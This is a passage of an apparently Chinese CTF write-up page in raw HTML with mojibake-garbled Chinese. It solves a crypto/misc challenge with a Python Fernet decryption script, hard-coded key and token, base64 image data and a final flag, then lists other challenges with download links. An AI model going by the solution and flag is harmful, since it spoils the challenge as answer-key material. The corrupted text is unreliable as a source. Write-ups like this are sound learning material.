å¯†å‰ä¿¡æ¯ï¼š test message</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">åŠ å¯†å‰ä¿¡æ¯ï¼š test message</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">åŠ å¯†å‰ä¿¡æ¯ï¼š test message</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">åŠ å¯†å‰ä¿¡æ¯ï¼š test message</span><br><span class="line">è§£å¯†åä¿¡æ¯ï¼š å¥³,å°ç¾,<span class="number">500112202304217984</span>,<span class="number">12222222222</span>,<span class="number">111111111111</span>,<span class="number">22222</span>,<span class="number">333333</span></span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">åŠ å¯†å‰ä¿¡æ¯ï¼š test message</span><br><span class="line">è§£å¯†åä¿¡æ¯ï¼š e4 b8 <span class="number">80</span> e4 b8 aa <span class="number">74</span> <span class="number">78</span> <span class="number">74</span> <span class="number">0</span>a e5 <span class="number">95</span> <span class="number">86</span> e4 b8 <span class="number">9</span>a e8 ae a1 e5 <span class="number">88</span> <span class="number">92</span> ef bc <span class="number">88</span> e4 bb <span class="number">85</span> e4 be <span class="number">9</span>b e5 <span class="number">86</span> <span class="number">85</span> e9 <span class="number">83</span> a8 ef bc <span class="number">89</span> e6 ad a4 e5 a4 </span><br><span class="line"><span class="number">84</span> e7 <span class="number">9</span>c <span class="number">81</span> e7 <span class="number">95</span> a5 <span class="number">35</span> <span class="number">77</span> e5 ad <span class="number">97</span> <span class="number">0</span>a</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">åŠ å¯†å‰ä¿¡æ¯ï¼š test message</span><br><span class="line">è§£å¯†åä¿¡æ¯ï¼š bye??</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">åŠ å¯†å‰ä¿¡æ¯ï¼š test message</span><br><span class="line">è§£å¯†åä¿¡æ¯ï¼š no!I finally want to transmit a flag</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">åŠ å¯†å‰ä¿¡æ¯ï¼š test message</span><br></pre></td></tr></table></figure><p>fernet è§£å¯†ï¼Œä¸€ç›´è§£å°±è¡Œè§£å‡ºæ¥æ˜¯ä¸€ä¸ªå›¾ç‰‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"></span><br><span class="line"><span class="comment"># key = Fernet.generate_key()  # ç”Ÿæˆå¯†é’¥</span></span><br><span class="line"><span class="comment"># print(key)</span></span><br><span class="line">key = <span class="string">&quot;0smJ2LvvnQonNICFpjOF8CeuOcMIuYLNVbCDucWSVaw=&quot;</span></span><br><span class="line">f = Fernet(key)  <span class="comment"># ä½¿ç”¨å¯†é’¥å®ä¾‹åŒ–</span></span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;test message&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;åŠ å¯†å‰ä¿¡æ¯ï¼š&#x27;</span>, message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># token = f.encrypt(message.encode())</span></span><br><span class="line"><span class="comment"># print(&#x27;åŠ å¯†åä¿¡æ¯ï¼š&#x27;, token.decode())</span></span><br><span class="line">token = <span class="string">b&#x27;gAAAAABkGeI2QDhD2PlVFV2USJsTO2RxaUESQowz02khRfYI05-AiIFlDuP4HtLShGmGAXgKZ-sS5CXKfWv32mXJFUy7fItWPg==&#x27;</span></span><br><span class="line"></span><br><span class="line">decrypt_message = f.decrypt(token).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;è§£å¯†åä¿¡æ¯ï¼š&#x27;</span>, decrypt_message)</span><br></pre></td></tr></table></figure><p><img src="/images/others/image-20230401171310298.png" alt="image-20230401171310298"></p><p>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</p><p><img src="/images/others/image-20230401172512705.png" alt="image-20230401172512705"></p><p>flag:flag{a20cb3c9-141c-41c4-8255-0cd3eb95b681}</p><p>Beyond</p><p>æœªè§£ç­”åˆ†å€¼ : 500åˆ†</p><p>åœ¨æŸä¸ªå›½å®¶çº§è¡ŒåŠ¨ä¸­ï¼Œä½œä¸ºè“é˜Ÿç ”åˆ¤ä¸€å“¥çš„è€å¼ æ•è·åˆ°äº†ä¸€ä¸ªç¥ç§˜æµé‡ï¼Œç›´è§‰å‘Šè¯‰ä»–è¿™ä¸ç®€å•ï¼Œäºæ˜¯ä»–å°†è¿™ä¸ªæµé‡ä¿å­˜äº†ä¸‹æ¥ï¼Œä½ èƒ½ååŠ©ä»–å‘ç°å…¶ä¸­çš„ç§˜å¯†å—ï¼Ÿ</p><p><strong>AreYouOK</strong></p><p>åœ¨ä¸€æ¬¡ç¥ç§˜è¡ŒåŠ¨ä¸­ï¼Œç‰¹å·¥è€å¼ çš„æ‰‹æœºé­åˆ°äº†ç ´åï¼Œä¸è¿‡å¥½åœ¨è¿˜æœ‰å°ç±³æ‰‹ç¯ï¼Œç»„ç»‡å‘ä»–çš„æ‰‹ç¯å‘é€äº†è¡ŒåŠ¨æŒ‡ä»¤ï¼Œä½ èƒ½ååŠ©åˆ†æå…¶ä¸­çš„ç§˜å¯†å—ï¼Ÿflagæ ¼å¼ä¸ºflag{Battery_Message}</p><p><a href="https://pan.baidu.com/s/1nGvszy3VWD1SKUs3-zwtGw">é™„ä»¶ä¸‹è½½</a> æå–ç ï¼ˆGAMEï¼‰<a href="https://share.weiyun.com/CUe5Gph5">å¤‡ç”¨ä¸‹è½½</a></p><p>lose the key</p><p>æœªè§£ç­”åˆ†å€¼ : 157åˆ†</p><p>é¢˜ç›®å†…å®¹ï¼šlose my keyï¼Œget my likeã€‚</p><p><a href="https://pan.baidu.com/s/1lUE0VcUSLnb2zyK4WcxGEQ">é™„ä»¶ä¸‹è½½</a> æå–ç ï¼ˆGAMEï¼‰<a href="https://share.weiyun.com/ZvlmiWMe">å¤‡ç”¨ä¸‹è½½</a></p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>nooblog</p><p>æœªè§£ç­”åˆ†å€¼ : 500åˆ†</p><p>I am just a logic noob trying to talk logically.</p><p><a href="https://pan.baidu.com/s/1gxLc9lbq7mpqjD3G8u-1uw">é™„ä»¶ä¸‹è½½</a> æå–ç ï¼ˆGAMEï¼‰<a href="https://share.weiyun.com/z7QclIYK">å¤‡ç”¨ä¸‹è½½</a></p><p><img src="/images/others/image-20230401174456161.png" alt="image-20230401174456161"></p><p><img src="/images/others/image-20230401174257354.png" alt="image-20230401174257354"></p><p><img src="/images/others/image-20230401174445075.png" alt="image-20230401174445075"></p><p>1ã€ã€æå‰ä¸‹è½½ã€‘æŒ‘æˆ˜åŒºä¸€.rarï¼š<a 